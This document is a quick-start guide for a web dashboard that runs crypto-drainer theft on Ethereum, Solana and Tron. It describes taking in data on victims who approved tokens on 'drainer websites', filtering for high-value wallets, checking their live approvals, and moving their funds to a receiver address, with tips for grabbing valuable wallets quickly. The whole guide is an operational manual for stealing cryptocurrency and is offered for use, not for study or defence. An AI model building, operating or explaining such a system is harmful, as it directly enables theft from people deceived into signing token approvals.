# Quick Start Guide - Emergency Withdrawal Dashboard

## What This Dashboard Does
Manages token extractions from wallets that approved your drainer websites. Built with Next.js, TypeScript, and PostgreSQL.

## 5-Minute Setup

### Step 1: Get Access
- Admin must add your email first
- You'll be assigned either **Admin** (full access) or **Viewer** (read-only) role

### Step 2: Login
1. Open dashboard URL
2. Click **"Sign in with Email"**
3. Enter your authorized email
4. Check inbox for magic link
5. Click link = auto login

### Step 3: Install Wallets
- **Ethereum**: MetaMask
- **Solana**: Phantom/Solflare
- **Tron**: TronLink

### Step 4: Add Tokens (Admin Only)
1. Go to **Overview** page
2. Click **"Add Token"**
3. Add USDT, USDC, etc.
4. Tokens must be added before they appear in chain tabs

## Core Workflow

### A. Data Collection (Automatic)
- User approves tokens on your drainer site
- Drainer calls dashboard API with wallet info
- Data appears in **Wallet Data** tab

### B. Process Wallets
1. Go to **Ethereum/Solana/Tron** → **Wallet Data**
2. Use filters to find high-value wallets (e.g., balance 1000-5000)
3. Select wallets → **Update Balances** → **Check Approvals**
4. If balance > 10 and approval = true → Click **Process**
5. Status changes from "New" to "Pending"

### C. Execute Extraction
1. Go to **Execution** tab (shows only pending)
2. Select wallets → Click **"Execute Tokens"**
3. Enter receiver address (where funds go)
4. Approve in YOUR ADMIN WALLET
5. Status → "Executed" when complete

### D. Emergency Manual Transfer
1. Use **Manual Control** tab for urgent transfers
2. Enter from/to wallets, token, amount
3. Execute directly (bypasses workflow)

## Key Security Points
- **Two-layer security**: Login + Admin wallet requirement
- **API tokens**: Required for drainer → dashboard communication
- **Role-based**: Admins execute, Viewers only watch
- **Master wallets**: Configured in environment variables:
  - ETH: `NEXT_PUBLIC_ETH_MASTER_WALLET`
  - SOL: `NEXT_PUBLIC_SOLANA_DELEGATE_WALLET`
  - TRON: `NEXT_PUBLIC_TRON_MASTER_WALLET`

## Quick Management

### Team Management (Admin Only)
- Add members with email + role
- Remove members anytime

### API Tokens (Admin Only)
1. Go to **API Tokens**
2. Generate token with service name + duration
3. **Copy immediately** - only shown once!
4. Use as: `Authorization: Bearer YOUR_TOKEN`

## Status Guide
- **New** = Fresh from drainer
- **Pending** = Ready to execute
- **Executed** = Done

## Common Issues
- **No data?** → Check API token active
- **Can't process?** → Need balance > 10 + approval = true
- **Execution failed?** → Wrong wallet or insufficient gas
- **High gas warning?** → Amount exceeds balance

## Pro Tips
✅ Filter by balance to find valuable wallets
✅ Batch process for efficiency
✅ Always verify receiver address
✅ Keep admin wallet funded for gas
✅ Process high-value wallets quickly

---

*Full documentation: USER_GUIDE.md*